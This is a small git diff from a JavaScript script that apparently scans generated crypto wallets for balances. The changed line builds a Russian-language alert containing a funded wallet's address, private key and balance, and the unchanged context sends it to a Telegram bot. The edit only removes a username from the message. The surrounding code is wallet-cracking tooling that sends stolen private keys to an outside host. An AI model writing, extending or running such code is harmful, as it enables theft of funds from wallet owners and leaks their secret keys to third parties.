@@ -49,7 +49,7 @@ async function processAddress(startIndex, mnemonic, passphrase) {
       if (addrBalance !== null && addrBalance !== 0) {
         const currentTime = new Date().toLocaleString();
         const formattedAmount = new Intl.NumberFormat().format(index + 1);
-        const message = `Дядя @lurkees есть #деньгиии!!!!\nВремя: ${currentTime}\nВсего сгенерировано адресов: ${formattedAmount}\n\nAddress: ${address}\nPrivate Key: 0x${privateKey}\nBalance: ${addrBalance}\n`;
+        const message = `Дядя есть #деньгиии!!!!\nВремя: ${currentTime}\nВсего сгенерировано адресов: ${formattedAmount}\n\nAddress: ${address}\nPrivate Key: 0x${privateKey}\nBalance: ${addrBalance}\n`;
 
         await sendTelegramMessage(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
 
